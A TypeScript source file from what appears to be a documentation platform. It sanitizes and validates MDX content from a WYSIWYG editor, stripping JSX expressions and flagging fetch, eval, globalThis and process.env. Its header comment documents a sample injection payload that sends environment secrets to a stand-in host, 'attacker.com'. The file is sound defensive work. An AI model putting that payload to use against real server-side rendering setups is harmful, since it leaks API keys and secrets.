/**
 * Content sanitization for the WYSIWYG editor.
 *
 * The editor should never produce raw JSX expressions, but as a defense-in-depth
 * measure, we strip any JSX expression blocks from the markdown output before
 * saving. This prevents users from injecting arbitrary JavaScript that would
 * execute during SSR on our infrastructure.
 *
 * Attack vector: {(() => { fetch("attacker.com", { body: JSON.stringify(globalThis.env) }) })()}
 * This would exfiltrate environment variables (API keys, secrets) during server-side rendering.
 *
 * Defense layers:
 * 1. Editor never produces raw {} expressions (only known component tags)
 * 2. This sanitizer strips any {} expressions from saved markdown
 * 3. recma-sandbox.ts blocks dangerous globals at MDX compile time
 * 4. DOMPurify sanitizes the HTML output
 */

/** MDX components that are allowed in editor output */
const ALLOWED_COMPONENTS = new Set([
  "Callout",
  "Tabs", "Tab",
  "Card", "CardGroup",
  "Steps",
  "Accordion",
  "CodeBlock",
  "FileTree",
  "PackageManager",
  "TypeTable",
  "LinkCard", "CardGrid",
  "Snippet",
  "ApiPlayground",
  "CodeSamples",
  "ChangelogTimeline",
]);

/**
 * Strip dangerous JSX expression blocks from MDX content.
 * Preserves known component tags but removes arbitrary {expression} blocks.
 *
 * This is a pre-save sanitizer — runs before content is stored in D1.
 */
export function sanitizeEditorContent(markdown: string): string {
  // Strip inline JSX expressions: {anything} that isn't inside a code block
  // We preserve:
  //   - Code blocks (``` ... ```)
  //   - Inline code (` ... `)
  //   - Known JSX component attributes like title="..." or type="..."

  const lines = markdown.split("\n");
  let inCodeBlock = false;
  const sanitized: string[] = [];

  for (const line of lines) {
    // Track code block boundaries
    if (line.trim().startsWith("```")) {
      inCodeBlock = !inCodeBlock;
      sanitized.push(line);
      continue;
    }

    // Don't touch content inside code blocks
    if (inCodeBlock) {
      sanitized.push(line);
      continue;
    }

    // Strip standalone JSX expression lines: lines that are just {expression}
    // These are the dangerous ones (IIFEs, function calls, etc.)
    if (/^\s*\{[^}]*\}\s*$/.test(line) && !isComponentTag(line)) {
      // Check if this looks like an allowed pattern
      const trimmed = line.trim();
      // Allow simple string interpolation in component props
      if (trimmed.startsWith("<") || trimmed.startsWith("</")) {
        sanitized.push(line);
      } else {
        // Strip the expression — replace with empty line
        sanitized.push("");
      }
      continue;
    }

    // Strip inline expressions that aren't in backticks
    // Match {expression} but not inside `code` or component attributes
    let sanitizedLine = line;
    // Only strip expressions outside of backtick-delimited code
    sanitizedLine = stripInlineExpressions(sanitizedLine);

    sanitized.push(sanitizedLine);
  }

  return sanitized.join("\n");
}

/**
 * Check if a line is a JSX component tag (allowed).
 */
function isComponentTag(line: string): boolean {
  const trimmed = line.trim();
  // Match opening or closing component tags
  const match = trimmed.match(/^<\/?([A-Z]\w*)/);
  if (match) return ALLOWED_COMPONENTS.has(match[1]);
  return false;
}

/**
 * Strip {expression} blocks from a line, preserving code spans and component props.
 */
function stripInlineExpressions(line: string): string {
  let result = "";
  let i = 0;
  let inBacktick = false;

  while (i < line.length) {
    const ch = line[i];

    // Track backtick spans (inline code)
    if (ch === "`") {
      inBacktick = !inBacktick;
      result += ch;
      i++;
      continue;
    }

    // Inside backticks — pass through
    if (inBacktick) {
      result += ch;
      i++;
      continue;
    }

    // Found opening brace outside code — check if it's a JSX expression
    if (ch === "{") {
      // Find matching closing brace
      let depth = 1;
      let j = i + 1;
      while (j < line.length && depth > 0) {
        if (line[j] === "{") depth++;
        else if (line[j] === "}") depth--;
        j++;
      }

      if (depth === 0) {
        const expr = line.slice(i, j);
        // Allow simple prop expressions like {true} or {"string"}
        const inner = expr.slice(1, -1).trim();
        if (
          inner === "true" || inner === "false" ||
          /^"[^"]*"$/.test(inner) || /^'[^']*'$/.test(inner) ||
          /^\d+$/.test(inner)
        ) {
          result += expr;
        }
        // Strip everything else (function calls, IIFEs, etc.)
        i = j;
        continue;
      }
    }

    result += ch;
    i++;
  }

  return result;
}

/**
 * Validate that markdown content doesn't contain dangerous patterns.
 * Returns an array of warnings (empty = safe).
 */
export function validateEditorContent(markdown: string): string[] {
  const warnings: string[] = [];

  // Check for raw JSX expressions
  const lines = markdown.split("\n");
  let inCodeBlock = false;

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if (line.trim().startsWith("```")) {
      inCodeBlock = !inCodeBlock;
      continue;
    }
    if (inCodeBlock) continue;

    // Check for dangerous patterns
    if (/\bfetch\s*\(/.test(line)) warnings.push(`Line ${i + 1}: contains fetch() call`);
    if (/\bglobalThis\b/.test(line)) warnings.push(`Line ${i + 1}: references globalThis`);
    if (/\beval\s*\(/.test(line)) warnings.push(`Line ${i + 1}: contains eval() call`);
    if (/\bFunction\s*\(/.test(line)) warnings.push(`Line ${i + 1}: contains Function() constructor`);
    if (/\bprocess\.env\b/.test(line)) warnings.push(`Line ${i + 1}: references process.env`);
    if (/\bimport\s*\(/.test(line) && !line.trim().startsWith("```")) warnings.push(`Line ${i + 1}: contains dynamic import()`);
  }

  return warnings;
}
